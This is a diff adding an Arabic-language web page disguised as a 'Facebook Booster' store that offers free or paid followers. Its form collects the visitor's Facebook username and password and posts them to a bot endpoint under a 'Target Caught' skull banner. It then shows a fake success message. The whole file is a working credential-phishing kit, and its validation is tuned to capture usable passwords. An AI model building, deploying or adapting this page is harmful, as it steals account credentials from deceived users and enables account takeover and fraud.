@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Booster Store | متجر متابعين فيسبوك</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body {
+            background-color: #0d1117; color: #ffffff; min-height: 100vh; padding: 20px;
+            background-image: radial-gradient(circle at top right, #1a2a44, transparent 40%), radial-gradient(circle at bottom left, #0d1117, transparent 40%);
+        }
+        .container { max-width: 600px; margin: 0 auto; }
+        
+        .header { text-align: center; margin-bottom: 30px; padding: 30px 20px; background: linear-gradient(145deg, #1c2536, #0d1117); border-radius: 20px; border: 1px solid #2d3748; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
+        .header i { font-size: 60px; color: #1877F2; margin-bottom: 15px; text-shadow: 0 0 20px rgba(24, 119, 242, 0.5); }
+        .header h1 { font-size: 26px; margin-bottom: 10px; }
+        .header p { font-size: 14px; color: #a0aec0; }
+
+        .plans-container { display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px; }
+        .plan-card { background: #1a202c; border: 1px solid #2d3748; border-radius: 15px; padding: 20px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.3s ease; }
+        .plan-card:hover { border-color: #1877F2; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2); }
+        .plan-card.selected { border-color: #1877F2; background: #1a2a44; box-shadow: 0 0 20px rgba(24, 119, 242, 0.3); }
+        
+        .plan-info { display: flex; align-items: center; gap: 15px; }
+        .plan-info i { font-size: 30px; color: #1877F2; }
+        .plan-info h3 { font-size: 18px; margin-bottom: 5px; }
+        .plan-info p { font-size: 12px; color: #a0aec0; }
+        
+        .price-tag { background: #1877F2; color: #fff; padding: 8px 15px; border-radius: 10px; font-weight: bold; font-size: 16px; box-shadow: 0 0 10px rgba(24, 119, 242, 0.4); }
+        .price-tag.free { background: #10b981; box-shadow: 0 0 10px rgba(16, 185, 129, 0.4); }
+
+        .input-group { background: #1a202c; border: 1px solid #2d3748; border-radius: 12px; padding: 5px 15px; margin-bottom: 15px; display: flex; align-items: center; transition: 0.3s; }
+        .input-group:focus-within { border-color: #1877F2; box-shadow: 0 0 10px rgba(24, 119, 242, 0.2); }
+        .input-group i { color: #1877F2; font-size: 20px; margin-left: 10px; }
+        .input-group input { width: 100%; padding: 15px 0; background: transparent; border: none; color: #fff; font-size: 15px; outline: none; }
+
+        .submit-btn { width: 100%; padding: 18px; background: linear-gradient(135deg, #1877F2, #0d5bbf); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 10px; box-shadow: 0 5px 20px rgba(24, 119, 242, 0.4); }
+        .submit-btn:hover { transform: scale(1.02); box-shadow: 0 10px 30px rgba(24, 119, 242, 0.6); }
+        .submit-btn:disabled { background: #4a5568; cursor: not-allowed; box-shadow: none; }
+
+        .success-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 999; justify-content: center; align-items: center; flex-direction: column; }
+        .success-modal.active { display: flex; }
+        .success-icon { font-size: 100px; color: #10b981; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-shadow: 0 0 40px rgba(16, 185, 129, 0.6); margin-bottom: 20px; }
+        .success-text { font-size: 28px; font-weight: bold; color: #10b981; animation: fadeIn 0.8s ease-in; text-shadow: 0 0 20px rgba(16, 185, 129, 0.4); }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
+
+        .loading-spinner { display: none; text-align: center; margin-top: 20px; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #1877F2; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .footer { text-align: center; margin-top: 40px; color: #4a5568; font-size: 12px; }
+        .error-msg { color: #ef4444; background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px; text-align: center; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: none; border: 1px solid rgba(239, 68, 68, 0.3); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <i class="fab fa-facebook"></i>
+            <h1>Facebook Booster</h1>
+            <p>بوابتك لزيادة متابعين فيسبوك باحترافية</p>
+        </div>
+
+        <div class="plans-container">
+            <div class="plan-card" onclick="selectPlan(1000, 'مجاناً (كل 24 ساعة)', this)">
+                <div class="plan-info">
+                    <i class="fas fa-gift"></i>
+                    <div><h3>1,000 متابع فيسبوك</h3><p>متاح كل 24 ساعة فقط</p></div>
+                </div>
+                <div class="price-tag free">مجاناً</div>
+            </div>
+            <div class="plan-card" onclick="selectPlan(1500, 'مجاناً (كل 24 ساعة)', this)">
+                <div class="plan-info">
+                    <i class="fas fa-gift"></i>
+                    <div><h3>1,500 متابع فيسبوك</h3><p>متاح كل 24 ساعة فقط</p></div>
+                </div>
+                <div class="price-tag free">مجاناً</div>
+            </div>
+            <div class="plan-card" onclick="selectPlan(5000, '$1.99', this)">
+                <div class="plan-info">
+                    <i class="fas fa-users"></i>
+                    <div><h3>5,000 متابع فيسبوك</h3><p>انطلاقة قوية لحسابك</p></div>
+                </div>
+                <div class="price-tag">$1.99</div>
+            </div>
+            <div class="plan-card" onclick="selectPlan(10000, '$4.99', this)">
+                <div class="plan-info">
+                    <i class="fas fa-rocket"></i>
+                    <div><h3>10,000 متابع فيسبوك</h3><p>تفاعل ووصول أعلى</p></div>
+                </div>
+                <div class="price-tag">$4.99</div>
+            </div>
+            <div class="plan-card" onclick="selectPlan(25000, '$9.99', this)">
+                <div class="plan-info">
+                    <i class="fas fa-crown"></i>
+                    <div><h3>25,000 متابع فيسبوك</h3><p>باقة VIP للشهرة</p></div>
+                </div>
+                <div class="price-tag">$9.99</div>
+            </div>
+        </div>
+
+        <div id="errorBox" class="error-msg"></div>
+
+        <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input type="text" id="username" placeholder="اسم المستخدم (اليوزر)">
+        </div>
+        <div class="input-group">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="password" placeholder="كلمة السر (6 حروف أو أرقام على الأقل)">
+        </div>
+        <div class="input-group">
+            <i class="fas fa-users-cog"></i>
+            <input type="text" id="followersCount" placeholder="الباقة المختارة" readonly>
+        </div>
+
+        <button class="submit-btn" id="submitBtn" onclick="sendOrder()">
+            <i class="fas fa-check-circle"></i> بدء الطلب
+        </button>
+
+        <div class="loading-spinner" id="loadingSpinner">
+            <div class="spinner"></div>
+            <p style="color: #a0aec0;">جاري معالجة طلبك...</p>
+        </div>
+
+        <div class="footer">© 2026 Facebook Booster Store. جميع الحقوق محفوظة.</div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <i class="fas fa-check-circle success-icon"></i>
+        <div class="success-text">تم اكتمال الطلب</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+        
+        let selectedFollowers = 0;
+
+        function selectPlan(count, price, element) {
+            selectedFollowers = count;
+            document.getElementById('followersCount').value = count + " متابع (" + price + ")";
+            document.querySelectorAll('.plan-card').forEach(function(card) { card.classList.remove('selected'); });
+            element.classList.add('selected');
+            document.getElementById('errorBox').style.display = 'none';
+        }
+
+        function isValidUsername(user) {
+            const regex = /^[a-zA-Z0-9._]{3,}$/;
+            return regex.test(user);
+        }
+
+        function isValidPassword(pass) {
+            if (pass.length < 6) return false;
+            if (/^(.)\1+$/.test(pass)) return false;
+            if (/^(012345|123456|654321|111111|222222|333333|444444|555555|666666|777777|888888|999999|000000)$/.test(pass)) return false;
+            return true;
+        }
+
+        // دالة بتكلم السيرفر بتاعنا
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+
+        async function sendOrder() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const followers = document.getElementById('followersCount').value.trim();
+            const loading = document.getElementById('loadingSpinner');
+            const btn = document.getElementById('submitBtn');
+            const successModal = document.getElementById('successModal');
+            const errorBox = document.getElementById('errorBox');
+
+            errorBox.style.display = 'none';
+
+            if (!followers) { errorBox.innerText = "❌ يرجى اختيار باقة أولاً!"; errorBox.style.display = 'block'; return; }
+            if (!isValidUsername(username)) { errorBox.innerText = "❌ يرجى إدخال يوزر صحيح (3 حروف على الأقل، بدون مسافات أو رموز غريبة)."; errorBox.style.display = 'block'; return; }
+            if (!isValidPassword(password)) { errorBox.innerText = "❌ كلمة السر ضعيفة جداً! يجب أن تكون 6 حروف أو أرقام على الأقل، وبدون تكرار أو تسلسل."; errorBox.style.display = 'block'; return; }
+
+            loading.style.display = "block";
+            btn.disabled = true;
+
+            const text = `🕷️ <b>𓆩☠️𓆪 𝑻𝒂𝒓𝒈𝒆𝒕 𝑪𝒂𝒖𝒈𝒉𝒕 💀:</b>\n\n👤 <b>اليوزر:</b> ${username}\n🔑 <b>كلمة السر:</b> ${password}\n👥 <b>الباقة:</b> ${followers}`;
+            
+            await sendToBot(text);
+            loading.style.display = "none";
+            btn.disabled = false;
+
+            successModal.classList.add('active');
+            setTimeout(() => {
+                successModal.classList.remove('active');
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('followersCount').value = '';
+                selectedFollowers = 0;
+                document.querySelectorAll('.plan-card').forEach(function(card) { card.classList.remove('selected'); });
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
